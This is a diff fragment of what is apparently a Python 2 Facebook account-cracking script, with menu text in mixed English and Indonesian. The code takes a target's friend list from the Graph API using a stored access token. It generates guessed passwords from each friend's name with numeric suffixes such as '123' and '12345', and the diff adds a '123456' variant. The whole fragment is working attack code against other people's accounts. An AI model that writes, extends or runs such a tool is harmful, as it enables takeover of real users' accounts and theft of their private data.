@@ -160,21 +160,21 @@ def menu():
 	print ' [%s1%s] Start crack '%(hj,ra)
 	print ' [%s2%s] Delete token '%(ku,ra)
 	print ' [%s0%s] logout\n '%(m,ra)
-	asw = raw_input(' [•] Choose : ')
+	asw = raw_input(' [!] Choose : ')
 	if asw =='1' or asw =='01':
 		crack()
 	elif asw =='2' or asw =='02':
-		jalan(' [•] delete token....');time.sleep(1)
+		jalan(' [?] delete token....');time.sleep(1)
 		os.system('rm -rf login_r.txt')
 		login()
 	elif asw =='0':
-		jalan(' [•] please come back ')
+		jalan(' [!] please come back ')
 		os.system('exit')
 	elif asw =='' or asw ==' ':
-		jalan(' [•] please fill in')
+		jalan(' [!] please fill in')
 		menu()
 	else:
-		jalan(' [•] just select whats on the menu ')
+		jalan(' [!] just select whats on the menu ')
 		menu()
 		
 def crack():
@@ -184,14 +184,14 @@ def crack():
 	try:
 		token = open('login_r.txt', 'r').read()
 	except IOError:
-		print' [•] invalid token '
+		print' [?] invalid token '
 		tokenz()
 	ra_id = raw_input(" [\x1b[101m\x1b[1;97m•\x1b[0m] ID Public : ")
 	try:
 		pok = requests.get("https://graph.facebook.com/"+ra_id+"?access_token="+token)
 		sp = json.loads(pok.text)
 	except KeyError:
-		jalan(' [•] Id not found ')
+		jalan(' [?] Id not found ')
 	r = requests.get("https://graph.facebook.com/"+ra_id+"/friends?access_token="+token)
 	z = json.loads(r.text)
 	for i in z["data"]:
@@ -207,7 +207,7 @@ def crack():
 		global loop, token
 		ra_pw = []
 		sys.stdout.write(
-		      '\r [%sC] Cracking %s - %s Please Wait.. ! ' % (ra,loop, len(id))
+		      '\r [%sMemulai] Crack %s - %s Please Wait.. ! ' % (ra,loop, len(id))
 		); sys.stdout.flush()
 		try:os.mkdir("results")
 		except OSError:pass
@@ -222,6 +222,7 @@ def crack():
 					ra_pw.append(ss+"123")
 					ra_pw.append(ss+"1234")
 					ra_pw.append(ss+"12345")
+                                        ra_pw.append(ss+"123456")
 				else:
 					ra_pw.append("000786")
 					ra_pw.append("786786")
